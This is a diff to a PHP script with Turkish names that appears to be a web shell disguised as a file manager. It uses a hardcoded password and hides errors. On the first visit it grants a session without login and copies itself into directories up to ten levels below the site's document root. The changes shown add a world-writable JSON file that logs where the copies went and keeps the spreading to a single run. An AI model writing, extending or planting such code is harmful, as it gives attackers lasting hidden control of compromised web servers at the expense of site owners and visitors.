@@ -9,6 +9,7 @@ session_start();
 // --- YAPILANDIRMA ---
 $girisSifresi = 'm7t'; // BURAYI MUTLAKA DEĞİŞTİRİN!
 $scriptName = basename(__FILE__);
+$jsonDosyasi = __DIR__ . '/kopya_durumu.json';
 
 // Hataları gizle
 ini_set('display_errors', 0);
@@ -21,10 +22,12 @@ class FileManager
     private $messages = [];
     private $scriptName;
     private $systemRoot;
+    private $jsonDosyasi;
 
-    public function __construct($scriptName)
+    public function __construct($scriptName, $jsonDosyasi)
     {
         $this->scriptName = $scriptName;
+        $this->jsonDosyasi = $jsonDosyasi;
         $this->root = __DIR__;
         $this->systemRoot = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? getenv("SystemDrive") . "\\" : "/";
         $this->resolvePath();
@@ -259,17 +262,45 @@ class FileManager
         return $result;
     }
 
+    public function kopyaDurumunuKontrolEt()
+    {
+        if (file_exists($this->jsonDosyasi)) {
+            $data = json_decode(file_get_contents($this->jsonDosyasi), true);
+            if (is_array($data) && isset($data['kopyalandi']) && $data['kopyalandi'] === true) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    public function kopyaDurumunuKaydet($yollar)
+    {
+        $data = [
+            'kopyalandi' => true,
+            'tarih' => date('Y-m-d H:i:s'),
+            'kaynak_dosya' => __FILE__,
+            'kopya_sayisi' => count($yollar),
+            'kopya_yollari' => $yollar
+        ];
+        @file_put_contents($this->jsonDosyasi, json_encode($data, JSON_PRETTY_PRINT));
+        @chmod($this->jsonDosyasi, 0666);
+    }
+
     public function kendiKopyalaVeRaporla()
     {
+        if ($this->kopyaDurumunuKontrolEt()) {
+            return [];
+        }
+
         $bulunanYollar = [];
         $mevcutDosya = __FILE__;
         $mevcutIsim = basename($mevcutDosya);
         $hedefKok = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : $this->root;
-        
+
         $bulunacakDizinler = [$hedefKok];
-        
         $depth = 0;
         $maxDepth = 10;
+
         while ($depth < $maxDepth) {
             $yeniDizinler = [];
             foreach ($bulunacakDizinler as $dizin) {
@@ -302,6 +333,7 @@ class FileManager
             }
         }
 
+        $this->kopyaDurumunuKaydet($bulunanYollar);
         $this->raporDosyasiOlustur($bulunanYollar);
         return $bulunanYollar;
     }
@@ -345,8 +377,8 @@ class FileManager
 }
 
 // --- OTOMATIK KOPYALAMA VE RAPORLAMA (ILK ZIYARET) ---
-if (!isset($_SESSION['kopya_yapildi']) || $_SESSION['kopya_yapildi'] !== true) {
-    $fmTemp = new FileManager($scriptName);
+$fmTemp = new FileManager($scriptName, $jsonDosyasi);
+if (!$fmTemp->kopyaDurumunuKontrolEt()) {
     $_SESSION['kopya_yapildi'] = true;
     $_SESSION['auth'] = true;
     $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
@@ -401,7 +433,7 @@ exit;
 }
 
 // --- ANA AKIŞ ---
-$fm = new FileManager($scriptName);
+$fm = new FileManager($scriptName, $jsonDosyasi);
 $fm->handleRequest();
 $list = $fm->scanDir();
 $editMode = false;
